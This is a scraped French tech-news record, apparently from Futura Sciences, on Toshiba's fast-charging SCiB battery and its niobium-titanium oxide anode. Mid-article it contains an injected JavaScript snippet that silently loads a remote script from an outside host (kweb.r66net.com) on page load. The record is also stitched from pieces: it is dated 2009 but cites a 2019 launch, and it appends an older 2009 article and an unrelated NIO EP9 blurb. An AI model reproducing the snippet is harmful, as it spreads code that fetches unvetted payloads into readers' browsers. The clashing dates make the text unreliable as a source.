{"title": "Voitures electriques : une batterie rechargee en 6 minutes pour 320 km d'autonomie", "newspaper": "Futura Sciences", "author": ["Marc Zaffagni"], "date_publi": "2009-11-02", "content": "Toshiba a devoile une nouvelle version de sa technologie de batterie lithium-ion  Super Charge ion Battery  qui pourrait offrir jusqu'a 320 kilometres d'autonomie a une voiture avec un temps de charge de seulement six minutes. Sa commercialisation est prevue en 2019. Assurer a une  voiture electrique  une autonomie de 320 kilometres apres seulement six minutes de charge de sa batterie : voici ce que nous promet  Toshiba . L'industriel japonais vient de presenter une nouvelle generation de sa technologie de  batterie lithium-ion  SCiB ( Super Charge  ion  Battery ) dont le nouvel alliage de l'anode double la capacite de stockage par rapport aux materiaux actuels. C'est en 2008 que Toshiba a lance ses batteries SCiB qui peuvent etre rechargees a 90 % en seulement cinq minutes et offrent une  duree  de vie de dix ans. Ces batteries sont utilisees notamment par des  voitures electriques  de serie, comme la Mitsubishi i MiEV (Peugeot Ion en France) et la Honda Fit EV. Elles utilisent une anode d'oxyde de lithium-titane.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Un alliage d'oxyde de niobium-titane La nouvelle anode est basee sur un alliage d'oxyde de niobium-titane (NbTi), lequel presente des proprietes de supraconductivite a basse temperature. Toshiba explique qu'il maitrise une methode pour synthetiser et disposer des cristaux NbTi conduisant a doubler la densite de stockage par rapport a l'anode d'oxyde de lithium-titane. Des essais realises sur un prototype de batterie SCiB de 50 Ah ont montre qu'elle peut supporter 5.000 cycles de charge en conservant encore 90 % de sa capacite. En outre, la recharge rapide peut etre effectuee a des temperatures basses, jusqu'a -10 degC, en une dizaine de minutes. C'est ce qui permet a Toshiba d'estimer qu'une telle  batterie lithium-ion  integree a une voiture electrique pourrait offrir 320 km d'autonomie apres seulement six minutes de charge. La mise sur le marche de cette nouvelle technologie est prevue pour 2019. Pour en savoir plus Une voiture electrique chargee en 5 minutes ? Article initial de Relaxnews, paru le 2/11/2009 Toshiba annonce la creation d'une nouvelle usine pour produire en  masse  des batteries a charge rapide adaptees au secteur  automobile . L'objectif : recharger une voiture electrique en 5 minutes ... Deja developpe pour les secteurs electronique et informatique, ce type de  batterie SCiB  ( Super Charge ion Battery ) permettrait de reduire la duree de charge de maniere significative. Selon Toshiba, cinq minutes sont suffisantes pour recharger 90% de la batterie, soit un temps comparable a la duree necessaire pour faire un plein d'essence. Autre avantage, ces batteries SCiB peuvent etre utilisees quotidiennement pendant plus de dix ans et subir 6.000 cycles de charge-decharge sans perte majeure de performances, souligne le fabricant japonais. Temps de recharge actuel : d'une demi-heure a plusieurs heures Toshiba, qui possede deja une usine de fabrication de batteries SCiB, devrait ouvrir son deuxieme site de production au printemps 2011. La firme prevoit d'y produire 500.000 cellules par mois des la premiere annee, puis d'augmenter son rythme de production pour fournir les constructeurs de voitures electriques ou  hybrides  rechargeables sur secteur, comme les futures  Chevrolet Volt  et Opel Ampera. Actuellement, les voitures electriques mises au point par les constructeurs reclament plusieurs dizaines de minutes pour recharger leur  batterie lithium-ion . La  Nissan Leaf  et la  Mitsubishi i-Miev , qui seront commercialisees en Europe des la fin 2010, necessitent 30 minutes pour recharger 80% de la capacite de leur batterie depuis une borne specifique et meme plusieurs heures depuis une prise domestique de 200 volts. NIO EP9 : la supercar electrique la plus rapide du monde                       Avec une puissance de plus de 1.300 chevaux et une vitesse de pointe de 313 km/h, la NIO EP9 revendique le titre de supercar electrique la plus rapide du monde. Elle a recemment battu un record sur un tour du celebre circuit du Nurburgring, en Allemagne, et sur le Paul Ricard en France.                                       ", "theme": "tech"}